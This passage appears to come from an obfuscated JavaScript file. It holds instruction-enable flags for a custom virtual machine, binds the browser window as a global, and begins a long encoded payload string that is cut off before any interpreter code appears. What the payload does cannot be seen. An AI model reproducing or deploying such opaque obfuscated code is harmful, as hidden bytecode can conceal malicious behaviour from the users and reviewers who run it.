//begin preprocessor
var INS_nop = false;
var INS_dump = false;
var INS_report = false;
var INS_getvar = false;
var INS_jmp = false;
var INS_greq = false;
var INS_leeq = false;
var INS_gr = false;
var INS_neq_typed = false;
var INS_neq = false;
var INS_protokeys = false;
var INS_false = false;
var INS_true = false;
var INS_regex = false;
var INS_null = false;
var INS_call_10 = false;
var INS_call_9 = false;
var INS_call_8 = false;
var INS_call_7 = false;
var INS_call_6 = false;
var INS_call_5 = false;
var INS_call_4 = false;
var INS_call_3 = false;
var INS_typeof = false;
var INS_instanceof = false;
var INS_delete = false;
var INS_in = false;
var INS_xchg = false;
var INS_bit_not = false;
var INS_bit_xor = false;
var INS_bit_and = false;
var INS_bit_or = false;
var INS_shrz = false;
var INS_shl = false;
var INS_shr = false;
var INS_and = false;
var INS_or = false;
var INS_mod = false;
var INS_div = false;
var INS_mul = false;
var INS_obf_pushx = true;
var INS_context = true;
var INS_setvar = true;
var INS_jnz = true;
var INS_jz = true;
var INS_le = true;
var INS_eq_typed = true;
var INS_eq = true;
var INS_undefined = true;
var INS_arr = true;
var INS_obj = true;
var INS_call_2 = true;
var INS_call_1 = true;
var INS_call_0 = true;
var INS_setprop = true;
var INS_getprop = true;
var INS_global = true;
var INS_mov = true;
var INS_not = true;
var INS_sub = true;
var INS_add = true;
var glob = window;
var pl = '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